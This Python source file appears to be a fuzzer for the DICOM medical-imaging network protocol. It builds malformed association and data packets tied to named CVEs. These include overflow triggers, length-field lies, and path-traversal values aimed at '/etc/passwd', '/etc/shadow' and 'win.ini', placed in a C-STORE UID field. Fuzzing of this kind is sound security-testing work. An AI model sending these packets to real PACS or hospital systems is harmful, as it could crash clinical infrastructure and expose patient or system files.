"""DICOM (Digital Imaging and Communications in Medicine) Upper Layer Fuzzer.

DICOM is the dominant healthcare imaging transport (PACS, modalities, viewers).
Historically it has been one of the least-fuzzed healthcare protocols despite a
large body of memory-corruption CVEs in the C-side parsers (DCMTK, dcm4che
native, gdcm, Orthanc plugins). This fuzzer targets the DICOM Upper Layer (UL)
association / P-DATA state machine over TCP port 104.

Framing (DICOM PS3.8 Upper Layer PDUs):
    | PDU-type (1) | reserved (1) | PDU-length (4, big-endian) | body ... |

Modelled PDU types:
    0x01 A-ASSOCIATE-RQ   0x04 P-DATA-TF   0x05 A-RELEASE-RQ   0x07 A-ABORT

CVE coverage / attack rationale:
    - CVE-2015-8979  DCMTK storescp parsePresentationContext stack overflow
                     -> DICOM_PresContext_Overflow (many contexts + oversized UID)
    - CVE-2024-34508 dcmnet DIMSE null-deref on malformed command set
                     -> DICOM_DIMSE_Malformed
    - CVE-2022-2119 / CVE-2026-56445  C-STORE SOP Instance UID path traversal
                     -> DICOM_CStore_UID_Traversal
    - Length-field confusion / sub-item length over-read (generic UL parser class)
                     -> DICOM_PDU_Length_Lie, DICOM_SubItem_Length_Overflow
    - AE-title / PDU-type boundary handling
                     -> DICOM_AETitle_Overflow, DICOM_PDU_Type_Boundary
"""

import struct
from typing import List

from boofuzz import Group, Request, Static

from oida.fuzz.core.base_fuzzer import BaseFuzzer, CommonState, RequestInfo
from oida.fuzz.core.config import FuzzerConfig, ProtocolType
from oida.fuzz.primitives.dynamic import SmartBytes, SmartString, StringContext

# ---------------------------------------------------------------------------
# DICOM well-known UIDs
# ---------------------------------------------------------------------------
APP_CONTEXT_UID = b"1.2.840.10008.3.1.1.1"  # DICOM Application Context Name
VERIFICATION_SOP = b"1.2.840.10008.1.1"  # Verification SOP Class (C-ECHO)
IMPLICIT_VR_LE = b"1.2.840.10008.1.2"  # Implicit VR Little Endian transfer syntax
IMPL_CLASS_UID = b"1.2.826.0.1.3680043.8.498.1"  # arbitrary Implementation Class UID

CALLED_AE = b"ANY-SCP".ljust(16, b" ")  # 16-byte space-padded AE titles
CALLING_AE = b"FUZZ-SCU".ljust(16, b" ")

DEFAULT_PORT = 104


# ---------------------------------------------------------------------------
# UL PDU byte builders (all lengths big-endian, per PS3.8)
# ---------------------------------------------------------------------------
def _pdu_header(pdu_type: int, body_len: int) -> bytes:
    """PDU-type byte, reserved byte, PDU-length DWord (big-endian)."""
    return bytes([pdu_type, 0x00]) + struct.pack(">I", body_len)


def _pdu(pdu_type: int, body: bytes) -> bytes:
    return _pdu_header(pdu_type, len(body)) + body


def _item(item_type: int, value: bytes) -> bytes:
    """Generic UL variable item: type, reserved, length Word (BE), value."""
    return bytes([item_type, 0x00]) + struct.pack(">H", len(value)) + value


def _app_context() -> bytes:
    return _item(0x10, APP_CONTEXT_UID)


def _abstract_syntax(uid: bytes) -> bytes:
    return _item(0x30, uid)


def _transfer_syntax(uid: bytes) -> bytes:
    return _item(0x40, uid)


def _pres_context(pc_id: int, abstract_uid: bytes, transfer_uids: List[bytes]) -> bytes:
    body = bytes([pc_id, 0x00, 0x00, 0x00])
    body += _abstract_syntax(abstract_uid)
    for t in transfer_uids:
        body += _transfer_syntax(t)
    return _item(0x20, body)


def _user_info() -> bytes:
    max_pdu = bytes([0x51, 0x00]) + struct.pack(">H", 4) + struct.pack(">I", 16384)
    impl_class = _item(0x52, IMPL_CLASS_UID)
    return _item(0x50, max_pdu + impl_class)


def _assoc_header() -> bytes:
    """A-ASSOCIATE-RQ fixed prefix (everything before the variable items)."""
    return (
        struct.pack(">H", 1)  # protocol-version
        + struct.pack(">H", 0)  # reserved
        + CALLED_AE
        + CALLING_AE
        + b"\x00" * 32  # reserved
    )


def _baseline_assoc_body() -> bytes:
    variable = _app_context() + _pres_context(1, VERIFICATION_SOP, [IMPLICIT_VR_LE]) + _user_info()
    return _assoc_header() + variable


class DICOMFuzzer(BaseFuzzer):
    """DICOM Upper Layer protocol fuzzer (TCP/104).

    Strict 1:1 gating: every advertised request in get_request_definitions()
    maps to exactly one session.connect() guarded by is_request_enabled(), so
    --enable / --disable select precisely one request each.
    """

    PROTOCOL_NAME = "dicom"

    # Plain TCP socket health check every 5 test cases (mirrors iec104 cadence).
    DEFAULT_MONITORS = "socket:5"

    PROTOCOL_OPTIONS = {
        "called_ae_title": {
            "type": str,
            "default": "ANY-SCP",
            "description": "Called AE title (SCP) placed in A-ASSOCIATE-RQ",
            "example": "STORESCP",
        },
        "calling_ae_title": {
            "type": str,
            "default": "FUZZ-SCU",
            "description": "Calling AE title (SCU) placed in A-ASSOCIATE-RQ",
            "example": "FUZZER",
        },
    }

    def __init__(self, config: FuzzerConfig, connection_factory=None):
        # DICOM UL rides on a plain TCP stream; rely on the injected factory so
        # tests can substitute MockConnectionFactory (do NOT override _create_socket).
        config.protocol_type = ProtocolType.TCP
        if not config.target_port:
            config.target_port = DEFAULT_PORT
        super().__init__(config, connection_factory)

    @classmethod
    def get_request_definitions(cls) -> List[RequestInfo]:
        return [
            RequestInfo(
                "DICOM_Baseline",
                "Valid A-ASSOCIATE-RQ (Verification SOP + Implicit VR LE)",
                "baseline",
                requires_state=CommonState.CONNECTED,
            ),
            RequestInfo(
                "DICOM_PresContext_Overflow",
                "Many presentation contexts + oversized abstract-syntax UID "
                "(CVE-2015-8979 parsePresentationContext stack overflow)",
                "overflow",
                requires_state=CommonState.CONNECTED,
            ),
            RequestInfo(
                "DICOM_PDU_Length_Lie",
                "PDU-length DWord {0, 0xFFFFFFFF, >actual, <actual} vs real body",
                "boundary",
                requires_state=CommonState.CONNECTED,
            ),
            RequestInfo(
                "DICOM_SubItem_Length_Overflow",
                "Abstract-syntax sub-item length larger than UID bytes, truncated tail",
                "overflow",
                requires_state=CommonState.CONNECTED,
            ),
            RequestInfo(
                "DICOM_DIMSE_Malformed",
                "P-DATA-TF with malformed DIMSE command set "
                "(CVE-2024-34508 dcmnet null-deref class)",
                "malformed",
                requires_state=CommonState.CONNECTED,
            ),
            RequestInfo(
                "DICOM_CStore_UID_Traversal",
                "C-STORE-RQ AffectedSOPInstanceUID path traversal (CVE-2022-2119 / CVE-2026-56445)",
                "malformed",
                requires_state=CommonState.CONNECTED,
            ),
            RequestInfo(
                "DICOM_PDU_Type_Boundary",
                "PDU-type byte sweep {0x00-0x07, 0xFF}",
                "boundary",
                requires_state=CommonState.CONNECTED,
            ),
            RequestInfo(
                "DICOM_AETitle_Overflow",
                "Called/Calling AE title oversized, non-space-padded, spilling into "
                "following fields",
                "overflow",
                requires_state=CommonState.CONNECTED,
            ),
        ]

    # ------------------------------------------------------------------
    # Protocol definition (strict 1:1 gating)
    # ------------------------------------------------------------------
    def _define_protocol(self) -> None:
        if self.is_request_enabled("DICOM_Baseline"):
            self.session.connect(self._build_baseline())
        if self.is_request_enabled("DICOM_PresContext_Overflow"):
            self.session.connect(self._build_prescontext_overflow())
        if self.is_request_enabled("DICOM_PDU_Length_Lie"):
            self.session.connect(self._build_pdu_length_lie())
        if self.is_request_enabled("DICOM_SubItem_Length_Overflow"):
            self.session.connect(self._build_subitem_length_overflow())
        if self.is_request_enabled("DICOM_DIMSE_Malformed"):
            self.session.connect(self._build_dimse_malformed())
        if self.is_request_enabled("DICOM_CStore_UID_Traversal"):
            self.session.connect(self._build_cstore_uid_traversal())
        if self.is_request_enabled("DICOM_PDU_Type_Boundary"):
            self.session.connect(self._build_pdu_type_boundary())
        if self.is_request_enabled("DICOM_AETitle_Overflow"):
            self.session.connect(self._build_aetitle_overflow())

    # -- 1. baseline ----------------------------------------------------
    def _build_baseline(self) -> Request:
        pdu = _pdu(0x01, _baseline_assoc_body())
        return Request(
            "DICOM_Baseline",
            children=(Static("assoc_rq", pdu),),
        )

    # -- 2. presentation-context overflow (CVE-2015-8979) ---------------
    def _build_prescontext_overflow(self) -> Request:
        # Prefix: many small valid presentation contexts to stress the parser's
        # per-context bookkeeping (the loop that overflowed in storescp).
        variable = _app_context()
        for i in range(64):
            pc_id = (2 * i + 1) & 0xFF or 1
            variable += _pres_context(pc_id, VERIFICATION_SOP, [IMPLICIT_VR_LE])

        # One final presentation context whose abstract-syntax UID is oversized.
        # SmartBytes is the fuzzable variable field; its default render already
        # carries an over-long UID that overruns the fixed parse buffer.
        oversized_uid = b"1.2.840.10008.1.1." + b"9" * 1024
        as_subitem_hdr = bytes([0x30, 0x00]) + struct.pack(">H", len(oversized_uid))
        transfer = _transfer_syntax(IMPLICIT_VR_LE)
        ctx_inner_len = 4 + len(as_subitem_hdr) + len(oversized_uid) + len(transfer)
        ctx_prefix = bytes([0x20, 0x00]) + struct.pack(">H", ctx_inner_len)
        ctx_prefix += bytes([0x7F, 0x00, 0x00, 0x00]) + as_subitem_hdr

        prefix = _assoc_header() + variable + ctx_prefix
        suffix = transfer + _user_info()

        body_len = len(prefix) + len(oversized_uid) + len(suffix)
        return Request(
            "DICOM_PresContext_Overflow",
            children=(
                Static("pdu_prefix", _pdu_header(0x01, body_len) + prefix),
                SmartBytes("abstract_syntax_uid", oversized_uid, max_len=65535, fuzzable=True),
                Static("pdu_suffix", suffix),
            ),
        )

    # -- 3. PDU length lie ----------------------------------------------
    def _build_pdu_length_lie(self) -> Request:
        body = _baseline_assoc_body()
        actual = len(body)
        return Request(
            "DICOM_PDU_Length_Lie",
            children=(
                Static("pdu_type", bytes([0x01, 0x00])),
                Group(
                    "pdu_length",
                    values=[
                        b"\x00\x00\x00\x00",  # zero
                        b"\xff\xff\xff\xff",  # max
                        struct.pack(">I", actual + 4096),  # declared > actual
                        struct.pack(">I", 4),  # declared < actual
                    ],
                ),
                Static("assoc_body", body),
            ),
        )

    # -- 4. sub-item length over-read -----------------------------------
    def _build_subitem_length_overflow(self) -> Request:
        short_uid = VERIFICATION_SOP  # 17 bytes, far shorter than the declared length
        # Presentation-context item; inner length is deliberately left as the
        # baseline value while the abstract-syntax sub-item length is oversized
        # AND the item is truncated (no transfer syntax follows).
        ctx_prefix = bytes([0x7F, 0x00, 0x00, 0x00])  # pc-id + reserved(3)
        ctx_prefix += bytes([0x30, 0x00])  # abstract-syntax sub-item type + reserved
        pres_prefix = bytes([0x20, 0x00]) + struct.pack(">H", 4 + 4 + len(short_uid))

        prefix = _assoc_header() + _app_context() + pres_prefix + ctx_prefix
        # length Group is placed BEFORE the (short, truncated) UID bytes
        body_after_len = short_uid  # tail truncated here on purpose
        body_len = len(prefix) + 2 + len(body_after_len)
        return Request(
            "DICOM_SubItem_Length_Overflow",
            children=(
                Static("pdu_prefix", _pdu_header(0x01, body_len) + prefix),
                Group(
                    "abstract_syntax_len",
                    values=[
                        b"\x00\x40",  # 64
                        b"\x01\x00",  # 256
                        b"\x04\x00",  # 1024
                        b"\xff\xff",  # 65535 -- vastly exceeds the 17 UID bytes
                    ],
                ),
                Static("truncated_uid", body_after_len),
            ),
        )

    # -- 5. malformed DIMSE (CVE-2024-34508 null-deref class) -----------
    def _build_dimse_malformed(self) -> Request:
        # A command set MISSING the (0000,0000) command group length, whose sole
        # element (0000,1000) declares a bogus length -- classic DIMSE parser
        # null-deref / over-read trigger.
        value = b"1.2.3"
        tag = struct.pack("<HH", 0x0000, 0x1000)  # implicit-VR LE tag
        pdv_prefix = bytes([0x01, 0x03])  # pc-id + message-control-header (command, last)

        # PDV/PDU lengths computed on the default (0xFFFFFFFF) length rendering.
        default_len = struct.pack("<I", 0xFFFFFFFF)
        pdv_payload_len = len(pdv_prefix) + len(tag) + len(default_len) + len(value)
        pdu_body_len = 4 + pdv_payload_len  # + PDV length DWord

        return Request(
            "DICOM_DIMSE_Malformed",
            children=(
                Static(
                    "pdu_pdv_prefix",
                    _pdu_header(0x04, pdu_body_len)
                    + struct.pack(">I", pdv_payload_len)
                    + pdv_prefix
                    + tag,
                ),
                Group(
                    "element_length",
                    values=[
                        b"\xff\xff\xff\xff",  # huge length, short value
                        b"\x00\x00\x00\x00",  # zero length
                        b"\x00\x00\x01\x00",  # 0x10000, over-read
                        b"\x01\x00\x00\x00",  # odd length for a UID element
                    ],
                ),
                Static("element_value", value),
            ),
        )

    # -- 6. C-STORE UID path traversal (CVE-2022-2119 / CVE-2026-56445) --
    def _build_cstore_uid_traversal(self) -> Request:
        traversal = "../../../../etc/passwd"
        pdv_prefix = bytes([0x01, 0x03])

        default_uid = traversal.encode()
        # Lengths computed against the default UID render.
        elem_hdr = struct.pack("<HHI", 0x0000, 0x1000, len(default_uid))
        # Command set elements preceding AffectedSOPInstanceUID, so the P-DATA-TF
        # is well-formed up to the UID element carrying the traversal payload.
        # Pass the trailing UID-element length so Command Group Length counts it.
        head = _command_set_head_for_traversal(len(elem_hdr) + len(default_uid))
        pdv_payload_len = len(pdv_prefix) + len(head) + len(elem_hdr) + len(default_uid)
        pdu_body_len = 4 + pdv_payload_len

        return Request(
            "DICOM_CStore_UID_Traversal",
            children=(
                Static(
                    "pdu_pdv_cmd_head",
                    _pdu_header(0x04, pdu_body_len)
                    + struct.pack(">I", pdv_payload_len)
                    + pdv_prefix
                    + head
                    + elem_hdr,
                ),
                # Windows-style and deeper traversal variants are added as extra
                # mutation candidates on this SAME field (not a sibling block) so
                # each one reaches the wire as a clean, standalone UID value
                # instead of being concatenated after the default unix payload.
                SmartString(
                    "affected_sop_instance_uid",
                    traversal,
                    max_len=4096,
                    context=StringContext.PATH,
                    fuzzable=True,
                    fuzz_values=[
                        b"..\\..\\..\\..\\windows\\win.ini",
                        b"../../../../../../etc/shadow",
                        b"....//....//etc/passwd",
                    ],
                ),
            ),
        )

    # -- 7. PDU-type boundary -------------------------------------------
    def _build_pdu_type_boundary(self) -> Request:
        body = _baseline_assoc_body()
        return Request(
            "DICOM_PDU_Type_Boundary",
            children=(
                Group(
                    "pdu_type",
                    values=[
                        b"\x01",
                        b"\x02",
                        b"\x03",
                        b"\x04",
                        b"\x05",
                        b"\x06",
                        b"\x07",
                        b"\x00",
                        b"\xff",
                    ],
                ),
                Static("reserved", b"\x00"),
                Static("pdu_length", struct.pack(">I", len(body))),
                Static("body", body),
            ),
        )

    # -- 8. AE-title overflow -------------------------------------------
    def _build_aetitle_overflow(self) -> Request:
        # Non-space-padded oversized AE titles that spill past the fixed 16-byte
        # Called/Calling fields into the reserved region and variable items.
        called = b"A" * 64
        calling = b"B" * 64
        variable = (
            _app_context() + _pres_context(1, VERIFICATION_SOP, [IMPLICIT_VR_LE]) + _user_info()
        )
        # protocol-version + reserved come first, then the two AE fields.
        prefix = struct.pack(">H", 1) + struct.pack(">H", 0)
        suffix = b"\x00" * 32 + variable
        body_len = len(prefix) + len(called) + len(calling) + len(suffix)
        return Request(
            "DICOM_AETitle_Overflow",
            children=(
                Static("pdu_prefix", _pdu_header(0x01, body_len) + prefix),
                SmartBytes("called_ae", called, max_len=4096, fuzzable=True),
                SmartBytes("calling_ae", calling, max_len=4096, fuzzable=True),
                Static("assoc_suffix", suffix),
            ),
        )


def _command_set_head_for_traversal(trailing_len: int = 0) -> bytes:
    """C-STORE-RQ command set elements preceding AffectedSOPInstanceUID.

    Includes (0000,0000) command group length so the P-DATA-TF is well-formed up
    to the UID element that carries the path-traversal payload.
    """
    elements = b""
    elements += struct.pack("<HHI", 0x0000, 0x0002, len(VERIFICATION_SOP)) + VERIFICATION_SOP
    elements += struct.pack("<HHI", 0x0000, 0x0100, 2) + struct.pack("<H", 0x0001)
    elements += struct.pack("<HHI", 0x0000, 0x0110, 2) + struct.pack("<H", 0x0001)
    elements += struct.pack("<HHI", 0x0000, 0x0700, 2) + struct.pack("<H", 0x0000)
    # Command Group Length (0000,0000) must count ALL following command-set
    # elements, including the AffectedSOPInstanceUID element the caller appends
    # after this head (trailing_len). Omitting it made group length under-count,
    # so a parser that reads the command set by group length stops before the
    # UID element and never parses the path-traversal payload.
    group_len = struct.pack("<HHI", 0x0000, 0x0000, 4) + struct.pack(
        "<I", len(elements) + trailing_len
    )
    return group_len + elements
